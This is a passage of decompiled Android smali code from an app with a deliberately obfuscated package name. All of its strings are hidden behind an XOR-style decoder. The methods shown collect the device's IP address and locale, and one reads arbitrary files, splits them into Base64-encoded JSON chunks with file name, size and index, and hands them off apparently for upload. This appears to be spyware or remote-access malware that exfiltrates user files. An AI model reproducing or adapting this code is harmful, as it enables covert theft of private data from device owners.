    move-result-object p0

    :catch_0
    :goto_0
    invoke-virtual {p0}, Ljava/util/regex/Matcher;->find()Z

    move-result v1

    if-eqz v1, :cond_2

    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-virtual {p0}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const/4 v2, 0x5

    new-array v2, v2, [B

    fill-array-data v2, :array_4

    new-array v4, v3, [B

    fill-array-data v4, :array_5

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I

    move-result v2

    const/4 v4, 0x3

    if-le v2, v4, :cond_1

    const/4 v2, 0x1

    new-array v2, v2, [B

    const/4 v4, 0x0

    const/16 v5, 0x40

    aput-byte v5, v2, v4

    new-array v4, v3, [B

    fill-array-data v4, :array_6

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_1
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :cond_2
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0

    nop

    :array_0
    .array-data 1
        0x1ct
        -0x47t
        -0x16t
        0x3ct
        0x15t
        -0x7dt
        -0x5et
    .end array-data

    :array_1
    .array-data 1
        -0x7t
        0x22t
        0x54t
        -0x26t
        -0x4ct
        0xbt
        -0x68t
        -0x75t
    .end array-data

    :array_2
    .array-data 1
        -0x4bt
        0x79t
        0x72t
        -0x7dt
        -0x64t
        0x4dt
        0x7t
    .end array-data

    :array_3
    .array-data 1
        -0x17t
        0x2t
        0x5ct
        -0x57t
        -0x5dt
        0x11t
        0x7at
        -0x7t
    .end array-data

    :array_4
    .array-data 1
        -0x65t
        0x65t
        0xat
        -0x44t
        -0x3dt
    .end array-data

    nop

    :array_5
    .array-data 1
        -0xet
        0xbt
        0x6et
        -0x27t
        -0x45t
        -0x4ft
        0x5ft
        -0x1ct
    .end array-data

    :array_6
    .array-data 1
        0x6et
        -0x1t
        0x59t
        0x2t
        0x2ft
        0x6bt
        -0x75t
        -0x3ct
    .end array-data
.end method

.method public static t()Ljava/lang/String;
    .locals 1

    .line 1
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/Locale;->getCountry()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public static u()Ljava/lang/String;
    .locals 4

    .line 1
    :try_start_0
    invoke-static {}, Ljava/net/NetworkInterface;->getNetworkInterfaces()Ljava/util/Enumeration;

    move-result-object v0

    :cond_0
    invoke-interface {v0}, Ljava/util/Enumeration;->hasMoreElements()Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-interface {v0}, Ljava/util/Enumeration;->nextElement()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/net/NetworkInterface;

    invoke-virtual {v1}, Ljava/net/NetworkInterface;->getInetAddresses()Ljava/util/Enumeration;

    move-result-object v1

    :cond_1
    invoke-interface {v1}, Ljava/util/Enumeration;->hasMoreElements()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-interface {v1}, Ljava/util/Enumeration;->nextElement()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/net/InetAddress;

    invoke-virtual {v2}, Ljava/net/InetAddress;->isLoopbackAddress()Z

    move-result v3

    if-nez v3, :cond_1

    instance-of v3, v2, Ljava/net/Inet4Address;

    if-eqz v3, :cond_1

    invoke-virtual {v2}, Ljava/net/InetAddress;->getHostAddress()Ljava/lang/String;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_2
    const/4 v0, 0x6

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    return-object v0

    nop

    :array_0
    .array-data 1
        -0x7ft
        -0x4at
        0x4et
        0x6dt
        -0x5bt
        0xbt
    .end array-data

    nop

    :array_1
    .array-data 1
        0x67t
        0x2at
        -0x1ct
        -0x76t
        0x3at
        -0x52t
        -0x2ct
        -0x5ft
    .end array-data
.end method

.method private static v(Ljava/lang/String;)Ljava/lang/String;
    .locals 8

    .line 1
    invoke-virtual {p0}, Ljava/lang/String;->hashCode()I

    move-result v0

    const/4 v1, 0x2

    const/4 v2, 0x4

    const/4 v3, 0x3

    const/4 v4, 0x0

    const/4 v5, 0x1

    const/16 v6, 0x8

    packed-switch v0, :pswitch_data_0

    goto/16 :goto_0

    :pswitch_0
    new-array v0, v5, [B

    const/16 v7, 0x48

    aput-byte v7, v0, v4

    new-array v4, v6, [B

    fill-array-data v4, :array_0

    invoke-static {v0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    move v4, v2

    goto :goto_1

    :pswitch_1
    new-array v0, v5, [B

    const/16 v7, -0x45

    aput-byte v7, v0, v4

    new-array v4, v6, [B

    fill-array-data v4, :array_1

    invoke-static {v0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    move v4, v3

    goto :goto_1

    :pswitch_2
    new-array v0, v5, [B

    const/16 v7, 0x50

    aput-byte v7, v0, v4

    new-array v4, v6, [B

    fill-array-data v4, :array_2

    invoke-static {v0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    move v4, v1

    goto :goto_1

    :pswitch_3
    new-array v0, v5, [B

    const/16 v7, -0x28

    aput-byte v7, v0, v4

    new-array v4, v6, [B

    fill-array-data v4, :array_3

    invoke-static {v0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    move v4, v5

    goto :goto_1

    :pswitch_4
    new-array v0, v5, [B

    const/16 v7, 0xd

    aput-byte v7, v0, v4

    new-array v7, v6, [B

    fill-array-data v7, :array_4

    invoke-static {v0, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    goto :goto_1

    :cond_0
    :goto_0
    const/4 v4, -0x1

    :goto_1
    const-string p0, ""

    if-eqz v4, :cond_5

    if-eq v4, v5, :cond_4

    if-eq v4, v1, :cond_3

    if-eq v4, v3, :cond_2

    if-eq v4, v2, :cond_1

    return-object p0

    :cond_1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    new-array v1, v3, [B

    fill-array-data v1, :array_5

    new-array v2, v6, [B

    fill-array-data v2, :array_6

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_2
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    new-array v1, v3, [B

    fill-array-data v1, :array_7

    new-array v2, v6, [B

    fill-array-data v2, :array_8

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_3
    const/16 p0, 0x13

    new-array p0, p0, [B

    fill-array-data p0, :array_9

    new-array v0, v6, [B

    fill-array-data v0, :array_a

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_4
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    new-array v1, v3, [B

    fill-array-data v1, :array_b

    new-array v2, v6, [B

    fill-array-data v2, :array_c

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->s(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_5
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    new-array v1, v3, [B

    fill-array-data v1, :array_d

    new-array v2, v6, [B

    fill-array-data v2, :array_e

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    return-object p0

    nop

    :pswitch_data_0
    .packed-switch 0x31
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch

    :array_0
    .array-data 1
        0x7dt
        0x74t
        -0x75t
        0x45t
        -0x33t
        -0x24t
        0x43t
        0x2at
    .end array-data

    :array_1
    .array-data 1
        -0x71t
        0x44t
        0x76t
        -0x3ft
        -0x7et
        0x6t
        0x36t
        0x8t
    .end array-data

    :array_2
    .array-data 1
        0x63t
        -0x5bt
        0x3bt
        -0x55t
        -0x54t
        0x24t
        -0x68t
        -0x4ct
    .end array-data

    :array_3
    .array-data 1
        -0x16t
        -0x4at
        -0x19t
        -0x7et
        0x2ft
        -0x28t
        -0x4et
        0x79t
    .end array-data

    :array_4
    .array-data 1
        0x3ct
        0x79t
        0x12t
        0x76t
        0x8t
        -0x29t
        -0x77t
        0x57t
    .end array-data

    :array_5
    .array-data 1
        -0x5t
        0xbt
        0x3bt
    .end array-data

    :array_6
    .array-data 1
        -0x6dt
        0x72t
        0x4bt
        0x22t
        0x56t
        0x52t
        -0x2dt
        -0x5t
    .end array-data

    :array_7
    .array-data 1
        -0xdt
        -0x56t
        0x6dt
    .end array-data

    :array_8
    .array-data 1
        -0x7ft
        -0x22t
        0x14t
        -0x31t
        -0x3at
        0x41t
        -0x1bt
        0x12t
    .end array-data

    :array_9
    .array-data 1
        0x1et
        -0x6et
        0x20t
        0x3t
        -0xet
        0x17t
        -0x6ft
        -0xct
        -0x30t
        0x6at
        -0x4bt
        -0x25t
        -0x5bt
        0x64t
        -0x7ft
        -0x5et
        -0x6ct
        0x5ft
        -0x3bt
    .end array-data

    :array_a
    .array-data 1
        0x71t
        -0x1et
        0x50t
        0x6ct
        0x17t
        -0x74t
        0x2ft
        0x12t
    .end array-data

    :array_b
    .array-data 1
        -0x2ct
        0x18t
        0x10t
    .end array-data

    :array_c
    .array-data 1
        -0x53t
        0x6dt
        0x79t
        -0x67t
        -0x4et
        0x31t
        0x9t
        0x55t
    .end array-data

    :array_d
    .array-data 1
        0x77t
        0x26t
        0x3et
    .end array-data

    :array_e
    .array-data 1
        0x6t
        0x51t
        0x5bt
        -0x47t
        -0x1t
        -0x65t
        -0x61t
        0x5ft
    .end array-data
.end method

.method private static synthetic w(Landroid/content/Context;Ljava/lang/String;)V
    .locals 16

    .line 1
    move-object/from16 v0, p1

    const/4 v1, 0x2

    :try_start_0
    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v4, v3, [B

    fill-array-data v4, :array_2

    new-array v5, v3, [B

    fill-array-data v5, :array_3

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    move-object/from16 v5, p0

    invoke-static {v5, v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_0

    return-void

    :cond_0
    new-instance v4, Ljava/io/File;

    invoke-direct {v4, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v5, Ljava/io/FileInputStream;

    invoke-direct {v5, v4}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-virtual {v4}, Ljava/io/File;->length()J

    move-result-wide v6

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pm0;->j(J)J

    move-result-wide v8

    long-to-int v8, v8

    new-array v8, v8, [B

    invoke-static {v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->n(Ljava/io/File;)Ljava/lang/String;

    move-result-object v9

    const/4 v10, 0x0

    move v11, v10

    move v12, v11

    :goto_0
    invoke-virtual {v5, v8}, Ljava/io/FileInputStream;->read([B)I

    move-result v13

    const/4 v14, -0x1

    if-eq v13, v14, :cond_1

    invoke-static {v8, v10, v13, v1}, Landroid/util/Base64;->encodeToString([BIII)Ljava/lang/String;

    move-result-object v14

    add-int/2addr v11, v13

    new-instance v13, Lorg/json/JSONObject;

    invoke-direct {v13}, Lorg/json/JSONObject;-><init>()V

    const/4 v15, 0x3

    new-array v15, v15, [B

    fill-array-data v15, :array_4

    new-array v1, v3, [B

    fill-array-data v1, :array_5

    invoke-static {v15, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v13, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v1, v3, [B

    fill-array-data v1, :array_6

    new-array v15, v3, [B

    fill-array-data v15, :array_7

    invoke-static {v1, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v13, v1, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v1, v3, [B

    fill-array-data v1, :array_8

    new-array v15, v3, [B

    fill-array-data v15, :array_9

    invoke-static {v1, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v13, v1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v1, 0x5

    new-array v1, v1, [B

    fill-array-data v1, :array_a

    new-array v15, v3, [B

    fill-array-data v15, :array_b

    invoke-static {v1, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v15, 0xa

    new-array v15, v15, [B

    fill-array-data v15, :array_c

    new-array v10, v3, [B

    fill-array-data v10, :array_d

    invoke-static {v15, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v13, v1, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v1, 0x4

    new-array v10, v1, [B

    fill-array-data v10, :array_e

    new-array v15, v3, [B

    fill-array-data v15, :array_f

    invoke-static {v10, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    new-array v1, v1, [B

    fill-array-data v1, :array_10

    new-array v15, v3, [B

    fill-array-data v15, :array_11

    invoke-static {v1, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v13, v10, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v1, v3, [B

    fill-array-data v1, :array_12

    new-array v10, v3, [B

    fill-array-data v10, :array_13

    invoke-static {v1, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v13, v1, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v1, v3, [B

    fill-array-data v1, :array_14

    new-array v10, v3, [B

    fill-array-data v10, :array_15

    invoke-static {v1, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v13, v1, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/16 v1, 0x9

    new-array v1, v1, [B

    fill-array-data v1, :array_16

    new-array v10, v3, [B

    fill-array-data v10, :array_17

    invoke-static {v1, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v13, v1, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    new-array v1, v3, [B

    fill-array-data v1, :array_18

    new-array v10, v3, [B

    fill-array-data v10, :array_19

    invoke-static {v1, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v13, v1, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const/16 v1, 0xb

    new-array v1, v1, [B

    fill-array-data v1, :array_1a

    new-array v10, v3, [B

    fill-array-data v10, :array_1b

    invoke-static {v1, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    add-int/lit8 v10, v12, 0x1

    invoke-virtual {v13, v1, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    invoke-virtual {v13}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->E(Ljava/lang/String;)V

    move v12, v10

    const/4 v1, 0x2

    const/4 v10, 0x0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    goto :goto_1

    :cond_1
    invoke-virtual {v5}, Ljava/io/FileInputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :goto_1
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_2
    return-void

    :array_0
    .array-data 1
        -0x2ct
        0x58t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x63t
        0x1ct
        -0x7et
        0x5at
        -0x4ct
        -0x79t
        0x2t
        -0x72t
    .end array-data

    :array_2
    .array-data 1
        -0x19t
        -0x35t
        0x1dt
        -0x4dt
        -0x24t
        0x62t
        0x3dt
        -0x78t
    .end array-data

    :array_3
    .array-data 1
        -0x5dt
        -0x52t
        0x6bt
        -0x26t
        -0x41t
        0x7t
        0x54t
        -0x14t
    .end array-data

    :array_4
    .array-data 1
        -0xct
        -0x17t
        0x19t
    .end array-data

    :array_5
    .array-data 1
        -0x7ct
        -0x80t
        0x7dt
        -0x23t
        0x5at
        0x47t
        -0x6ft
        -0x6et
    .end array-data

    :array_6
    .array-data 1
        -0x46t
        -0x17t
        0x1bt
        0x6t
        -0x51t
        0x4bt
        0x73t
        0x45t
    .end array-data

    :array_7
    .array-data 1
        -0x24t
        -0x80t
        0x77t
        0x63t
        -0x39t
        0x2at
        0x0t
        0x2dt
    .end array-data

    :array_8
    .array-data 1
        -0x6et
        0xat
        0x16t
        -0x37t
        0x2at
        0x0t
        -0x70t
        0x41t
    .end array-data

    :array_9
    .array-data 1
        -0xct
        0x63t
        0x7at
        -0x54t
        0x5at
        0x61t
        -0x1ct
        0x29t
    .end array-data

    :array_a
    .array-data 1
        0x41t
        0x59t
        -0x1bt
        -0x14t
        0x1ft
    .end array-data

    nop

    :array_b
    .array-data 1
        0x28t
        0x2dt
        -0x64t
        -0x64t
        0x7at
        0xft
        -0x3dt
        0x6dt
    .end array-data

    :array_c
    .array-data 1
        0x24t
        0x5ft
        0x6dt
        -0x2bt
        -0x48t
        0x1t
        0x7dt
        -0x7bt
        0x19t
        0x47t
    .end array-data

    nop

    :array_d
    .array-data 1
        0x77t
        0x33t
        0x1ft
        -0x76t
        -0x25t
        0x6dt
        0x14t
        -0x20t
    .end array-data

    :array_e
    .array-data 1
        0x78t
        -0x1bt
        0x3et
        -0x79t
    .end array-data

    :array_f
    .array-data 1
        0xbt
        -0x70t
        0x5ct
        -0x1ct
        -0x17t
        0x28t
        -0x33t
        -0x55t
    .end array-data

    :array_10
    .array-data 1
        0x73t
        -0x3dt
        0x21t
        0x43t
    .end array-data

    :array_11
    .array-data 1
        0x17t
        -0x54t
        0x56t
        0x2dt
        -0x60t
        0x64t
        -0x6bt
        -0x80t
    .end array-data

    :array_12
    .array-data 1
        -0x5ct
        0xat
        0x2ct
        -0x48t
        0x71t
        0x4ct
        -0x28t
        -0x45t
    .end array-data

    :array_13
    .array-data 1
        -0x3et
        0x63t
        0x40t
        -0x23t
        0x1ft
        0x2dt
        -0x4bt
        -0x22t
    .end array-data

    :array_14
    .array-data 1
        -0x5ft
        -0x56t
        0x7at
        0xct
        -0xdt
        0x69t
        0x1ct
        0x3et
    .end array-data

    :array_15
    .array-data 1
        -0x39t
        -0x3dt
        0x16t
        0x69t
        -0x69t
        0x8t
        0x68t
        0x5ft
    .end array-data

    :array_16
    .array-data 1
        0x4t
        -0x2t
        -0x6at
        -0x31t
        -0x72t
        0x61t
        -0x3t
        -0x8t
        0x15t
    .end array-data

    nop

    :array_17
    .array-data 1
        0x70t
        -0x6ft
        -0x1et
        -0x52t
        -0x1et
        0x32t
        -0x6ct
        -0x7et
    .end array-data

    :array_18
    .array-data 1
        0x52t
        -0x7bt
        0x4bt
        -0x5bt
        0x9t
        0x69t
        -0x53t
        -0x27t
    .end array-data

    :array_19
    .array-data 1
        0x21t
        -0x20t
        0x25t
        -0x2ft
        0x5at
        0x0t
        -0x29t
        -0x44t
    .end array-data

    :array_1a
    .array-data 1
        0x36t
        -0x54t
        0x29t
        0x5at
        -0x27t
        -0x6dt
        0x44t
        -0x6ft
        0x37t
        -0x5ft
        0x2et
    .end array-data

    :array_1b
    .array-data 1
        0x55t
        -0x3ct
        0x5ct
        0x34t
        -0x4et
        -0x23t
        0x31t
        -0x4t
    .end array-data
.end method

.method private static synthetic x([BLandroid/content/Context;)V
    .locals 8

    .line 1
    const/4 v0, 0x0

    :try_start_0
    invoke-static {p0, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p0

    const/4 v0, 0x2

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

